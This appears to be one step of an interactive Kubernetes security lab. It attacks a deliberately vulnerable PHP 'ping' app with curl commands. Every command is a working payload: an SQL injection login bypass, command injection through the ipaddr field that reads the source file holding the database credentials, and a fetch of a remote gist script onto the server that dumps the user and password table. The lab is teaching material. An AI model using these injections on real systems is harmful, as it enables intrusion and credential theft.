Unfortunately, it turns out our web application is faulty and susceptible to [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) attacks:
`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost" -X POST http://ping/ping.php`{{execute HOST1}}

An attacker can not only bypass the authentication mechanism, but even execute arbitrary commands:
`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ps aux" -X POST http://ping/ping.php`{{execute HOST1}}

Through a series of commands, the attacker could easily get the source code for our ping app, which contains the database credentials:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ls /var/www/" -X POST http://ping/ping.php`{{execute HOST1}}

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; ls /var/www/html" -X POST http://ping/ping.php`{{execute HOST1}}

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; cat /var/www/html/ping.php" -X POST http://ping/ping.php`{{execute HOST1}}

Once he knows the login details for the database, he could get a dump of its contents, including the table with all our users and their passwords:
`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; curl https://gist.githubusercontent.com/bencer/9e32fb1af89754b4ad8346b13dcd1110/raw/cd79134f420b59e84e6b60be3bdff7ca0bb42f1e/gistfile1.txt > /var/www/html/dump.php " -X POST http://ping/ping.php`{{execute HOST1}}

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; sed -i -e 's/db/mysql/' /var/www/html/dump.php" -X POST http://ping/ping.php`{{execute HOST1}}

`kubectl exec client -n ping -- curl http://ping/dump.php`{{execute HOST1}}
